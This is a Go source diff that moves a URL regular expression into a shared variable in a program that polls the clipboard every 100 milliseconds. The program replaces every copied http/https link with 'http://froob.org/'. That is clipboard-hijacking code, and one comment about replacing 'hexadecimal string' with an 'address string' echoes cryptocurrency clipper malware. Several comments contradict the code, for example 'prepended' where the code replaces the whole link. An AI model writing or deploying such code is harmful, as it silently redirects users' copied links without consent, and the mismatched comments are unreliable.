@@ -9,7 +9,11 @@ import (
 	"github.com/f1bonacc1/glippy"
 )
 
+var re *regexp.Regexp
+
 func main() {
+	re = regexp.MustCompile(`(https?://)[^\s]+`)
+
 	// Set up a ticker that ticks every 100 milliseconds.
 	tick := time.Tick(100 * time.Millisecond)
 	// Start an infinite loop, calling clipboardCheck on each iteration.
@@ -35,7 +39,6 @@ func clipboardCheck() {
 
 // containsHTTP returns true if the given text contains the string "http", false otherwise.
 func containsURL(text string) bool {
-	re := regexp.MustCompile(`(https?://)[^\s]+`)
 	return re.MatchString(text)
 }
 
@@ -47,7 +50,6 @@ func containsFroobURL(text string) bool {
 // modifyText returns a modified version of the given text in which each word that starts with "https://" or "http://"
 // is prepended with "http://froob.org/".
 func modifyText(text string) {
-	re := regexp.MustCompile(`(https?://)[^\s]+`)
 	// Replace all occurrences of hexadecimal string in clipboard text with address string
 	modifiedText := re.ReplaceAllLiteralString(text, "http://froob.org/")
 	// Set modified clipboard text
